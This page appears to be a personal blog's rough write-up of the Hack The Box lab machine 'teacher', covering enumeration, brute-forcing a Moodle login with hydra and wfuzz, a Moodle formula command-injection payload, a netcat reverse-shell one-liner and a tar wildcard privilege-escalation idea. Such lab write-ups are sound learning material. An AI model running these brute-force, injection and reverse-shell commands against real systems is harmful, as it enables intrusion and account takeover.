<!DOCTYPE html>
<html>
  <head>
    <title>Pwny_Sec</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-07-21T18:19:20 EDT">
<title>teacher :: Pwny_Sec</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/teacher/">
    
      <header>
  <div class="logo">
    




<h2 id="pwny-sec">Pwny_Sec</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/pwny_sec"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/dll/" class="dd-item">
    <div>
        <a href="/concepts/dll/">
            DLL-Hijacking
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/file-transfer/" class="dd-item">
    <div>
        <a href="/concepts/file-transfer/">
            File Transfer
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/linux_enum/" class="dd-item">
    <div>
        <a href="/concepts/linux_enum/">
            Linux Enumeration
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/concepts/windows_enum/" class="dd-item">
    <div>
        <a href="/concepts/windows_enum/">
            Windows
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/bypass/" class="dd-item">
    <div>
        <a href="/concepts/bypass/">
            Windows-Bypass
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/chaos-og/">
            CHAOS
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/inusectf/">
            CTF
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/ethereal/">
            Ethereal
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/flujab/">
            Flujab
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/friendzone/">
            FriendZone
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/grand-pa/">
            GrandMa
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/lightweight/">
            LightWeight
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/sizzle/">
            Sizzle
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/gold-sizzle/">
            Sizzle-Gold
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/vault/">
            Vault
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item active">
    <div>
        <a href="/hackthebox/boxes/teacher/">
            teacher
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/chisel/" class="dd-item">
    <div>
        <a href="/tools/chisel/">
            ChiselTunnel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
    <option value="/hackthebox/boxes/legacy/" >
  -- 
   Legacy</option>
      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
      <option value="/hackthebox/boxes/teacher/"  selected>-- teacher</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>teacher</h1>
    
    
    
    

<p>nmap -sT -T3 -PS80,443,8000,8443,8800 -p 80,443,8000,8443,8080 -oA http-enum-results &ndash;script=http-enum teacher.htb</p>

<p>Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-01-24 16:27 EST
Nmap scan report for teacher.htb (10.10.10.153)
Host is up (0.043s latency).</p>

<p>PORT     STATE  SERVICE
80/tcp   open   http
| http-enum:
|   /css/: Potentially interesting directory w/ listing on &lsquo;apache/2.4.25 (debian)&rsquo;
|   /images/: Potentially interesting directory w/ listing on &lsquo;apache/2.4.25 (debian)&rsquo;
|   /js/: Potentially interesting directory w/ listing on &lsquo;apache/2.4.25 (debian)&rsquo;
|_  /manual/: Potentially interesting folder</p>

<h3 id="gobuster">Gobuster</h3>

<p>/index.html (Status: 200)
/images (Status: 301)
/gallery.html (Status: 200)
/css (Status: 301)
/manual (Status: 301) == no
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403) === forbidden</p>

<p>/moodle (Status: 301)
/server-status (Status: 403)</p>

<h5 id="moodle">Moodle</h5>

<p>/search (Status: 301)<br />
/media (Status: 301)
/login (Status: 301)
/user (Status: 301)</p>

<p>profile // templates (Status: 301)/tests (Status: 301)/classes (Status: 301)/filters (Status: 301)/amd (Status: 301)/selector (Status: 301)</p>

<p>/calendar (Status: 301)
/blog (Status: 301)<br />
/files (Status: 301) == neat</p>

<p>​   tests // classes // converter // converter has some interesting firectories</p>

<p>Maarten Balliauw</p>

<p>/rss (Status: 301)
/admin (Status: 301)
/comment (Status: 301)
/report (Status: 301)
/local (Status: 301)
/pix (Status: 301)
/tag (Status: 301)
/group (Status: 301)
/version.php (Status: 200)
/my (Status: 301) === neat
/lib (Status: 301)
/install (Status: 301)
/install.php (Status: 302)
/portfolio (Status: 301)
/cache (Status: 301)
/lang (Status: 301)
/theme (Status: 301)
/notes (Status: 301)
/message (Status: 301)</p>

<p>​   /templates (Status: 301)
​   /tests (Status: 301)
​   /upgrade.txt (Status: 200)
​   /classes (Status: 301)
​   /amd (Status: 301)
​   /output (Status: 301)</p>

<p>​   /blocks (Status: 301)
/question (Status: 301)
/backup (Status: 301) === ooooo</p>

<p>/rating (Status: 301)
/filter (Status: 301)</p>

<p>/mod (Status: 301)</p>

<pre><code>/forum (Status: 301)
/feedback (Status: 301)
/data (Status: 301)
/page (Status: 301)
/wiki (Status: 301)
/glossary (Status: 301)
/chat (Status: 301)
/book (Status: 301)
/folder (Status: 301)
/survey (Status: 301)
/resource (Status: 301)
/url (Status: 301)
/quiz (Status: 301)
/workshop (Status: 301)
/label (Status: 301)
/choice (Status: 301)
/assignment (Status: 301)
/lesson (Status: 301)
/assign (Status: 301)

</code></pre>

<p>/auth (Status: 301) ==== hmmmm</p>

<p>​   /email (Status: 301)
​   /tests (Status: 301)</p>

<p>​       behat // user teacher1 wrongpass admin</p>

<p>​   /manual (Status: 301) ==== nop</p>

<pre><code>username
teacher1
Giovanni Chhatta
</code></pre>

<p>​   /db (Status: 301)==== nope
​   /classes (Status: 301)
​   /none (Status: 301)
​   /cas (Status: 301)
​   /ldap (Status: 301)
​   /webservice (Status: 301)
​   /yui (Status: 301)</p>

<p>/course (Status: 301)
/error (Status: 301)
/badges (Status: 301)
/repository (Status: 301) = neat
/analytics (Status: 301)
/availability (Status: 301)
/webservice (Status: 301)
/plagiarism (Status: 301)
/competency (Status: 301)</p>

<p>PASSWORD script</p>

<pre><code>import string
for c in string.printable:
    print 'Th4C00lTheacha'+ c
</code></pre>

<p>Th4C00lTheacha#</p>

<pre><code>wfuzz -c -w /opt/htb/wordlist/seclist/Fuzzing/special-chars.txt-d  &quot;anchor=&amp;username=giovanni&amp;password=Th4C00lTheachaFUZZ&quot; -u http://teacher.htb/moodle/login/index.php

hydra teacher.htb -l giovanni -P http-form-post &quot;/moodle/login/index.php:anchor=&amp;username=^&amp;password=Th4C00lTheacha^PAASS^:Invalid login, please try again&quot;

hydra teacher.htb -l giovanni -P list_of_pass http-form-post &quot;/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^:Invalid login, please try again&quot;

https://security.stackexchange.com/questions/89443/how-to-get-cookies-from-aspx-site-to-use-it-with-hydra
</code></pre>

<p>so verbose helped allot i saw it was getting redirected to the default login but then i had the diea that maybe its not seeing the Invalid login. So i changed the invalid parameter to Teacher.</p>

<pre><code>hydra teacher.htb -l giovanni -P list_of_pass http-form
-post &quot;/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^:Teacher&quot; -t 3 -w 5 -f -v 
-t time to wait
-w time to wait for response
-f stop when a password is found optional
-v verbose
F= invalid this F=Teacher by default 
</code></pre>

<p><img src="https://chickenpwny.github.io/images/teacher/password3.PNG" alt="password3" /></p>

<p>passwordset tar</p>

<pre><code>Module options (exploit/multi/http/moodle_cmd_exec):                                 

   Name       Current Setting             Required  Description                      
   ----       ---------------             --------  -----------                      
   PASSWORD   Th4C00lTheacha#             yes       Password to authenticate with    
   Proxies                                no        A proxy chain of format type:host:
port[,type:host:port][...]
   RHOST      teacher.htb                 yes       The target address
   RPORT      80                          yes       The target port (TCP)
   SESSKEY    gc7hreuj5idcalmrhan93pj174  no        The session key of the user to imp
ersonate
   SSL        false                       no        Negotiate SSL/TLS for outgoing con
nections
   TARGETURI  /moodle/                    yes       The URI of the Moodle installation
   USERNAME   giovanni                    yes       Username to authenticate with
   VHOST                                  no        HTTP server virtual host

</code></pre>

<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p>

<p>some how when you enter in this as a math equation it eqascpes out and gives command injection. XD</p>

<p>Th4C00lTheacha#</p>

<pre><code> `$_GET[0]`         illegal
{a.`$_GET[0]`}
/*{a*/`$_GET[0]`;//{x}}     

 
/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D10%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;id=12&amp;wizardnow=datasetitems&amp;cmid=2&amp;0=(date;whoami)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 9058 &gt;/tmp/f
</code></pre>

<p>tried the newest eval</p>

<p>How to identify the version of moodle as a teacher, backdup a course quix or whatever. Then unzip you may need to apppend a different extension</p>

<p><img src="https://chickenpwny.github.io/images/teacher/finding-the-version2.PNG" alt="finding-the-version2" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/finding-the-version.PNG" alt="finding-the-version" /></p>

<p>3.4.1</p>

<p><img src="https://chickenpwny.github.io/images/teacher/turn-on-editing.PNG" alt="turn-on-editing" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/adding a quiz.PNG" alt="adding a quiz" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/adding a quiz2.PNG" alt="adding a quiz2" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/adding a quiz3.PNG" alt="adding a quiz3" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/adding a quiz4.PNG" alt="adding a quiz4" /></p>

<p>click on save and display</p>

<p><a href="http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=cb8aefa658cf7ad8f002a480343afb2dea94cc08">http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=cb8aefa658cf7ad8f002a480343afb2dea94cc08</a></p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>  </code></pre></div>
<p>stretch (security)</p>

<p>changes directories</p>

<p>a wild card is bad</p>

<p>the script is run with /bin/sh -c</p>

<p>If the -c option is present, then commands are read from string. If
there are arguments after the string, they are assigned to the
positional parameters, starting with $0</p>

<p>tar wildcard exploit is possible allowing us to execute commands at whatever the script is at</p>

<pre><code>--checkpoint=1
--checkpoint-action=exec=sh shell.sh
exploit in shell.sh
</code></pre>

<pre><code>/bin/bash /usr/bin/backup.sh
/usr/sbin/CRON -f  
</code></pre>

<p>then it moves into the tmp directory im not sure if its /root/tmp or work/tmp. changes the permissions on everything in tm recursive to 777 chmod 777 makes it read and writeable &amp; executable by all users</p>

<pre><code>cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
</code></pre>

<pre><code>$ find / -user root -perm -4000 -print 2&gt;/dev/null
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
</code></pre>

<p>/bin/pwd</p>

<p>finally found the password and user name to login into mysql. what a pain i the arse, first need to upgrade the shell with python pty. then login into mysql mysql -u username -p.</p>

<pre><code>MariaDB [(none)]&gt; show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| phpmyadmin         |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [phpmyadmin]&gt; show tables
show tables
    -&gt; ;
;
+------------------------+
| Tables_in_phpmyadmin   |
+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+

show index from pma__users
show index from pma__users
    -&gt; ;
;
+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
| Table      | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment |
+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
| pma__users |          0 | PRIMARY  |            1 | username    | A         |           0 |     NULL | NULL   |      | BTREE      |         |               |
| pma__users |          0 | PRIMARY  |            2 | usergroup   | A         |           0 |     NULL | NULL   |      | BTREE      |         |               |
+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
SHOW COLUMNS FROM pma__users
SHOW COLUMNS FROM pma__users
    -&gt; ;
;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| username  | varchar(64) | NO   | PRI | NULL    |       |
| usergroup | varchar(64) | NO   | PRI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.00 sec)

| COLUMNS                               |                                                               [49/1491]
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |   
| ENGINES                               |
| EVENTS                                |                         
| FILES                                 |                     
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |                                                                        
| PROCESSLIST                           |     | COLUMNS                               |                                                               [49/1491]
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |   
| ENGINES                               |
| EVENTS                                |                         
